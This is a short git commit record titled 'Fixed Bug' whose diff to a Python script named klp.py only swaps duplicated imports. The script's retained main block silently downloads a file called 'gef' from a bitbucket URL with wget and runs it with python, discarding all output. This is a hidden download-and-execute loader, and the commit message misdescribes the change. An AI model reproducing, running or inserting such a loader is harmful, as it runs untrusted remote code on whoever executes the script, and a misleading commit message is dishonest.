b550d8458329fede8bac7363cae14128694a67de
gakira munshi <gakimarki@proton.me>
2024-12-21 01:34:07 -0500

    Fixed Bug

--- klp.py
+++ klp.py
@@ -1,3 +1,3 @@
-import os, compileall,compileall
+import os, trace,trace
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
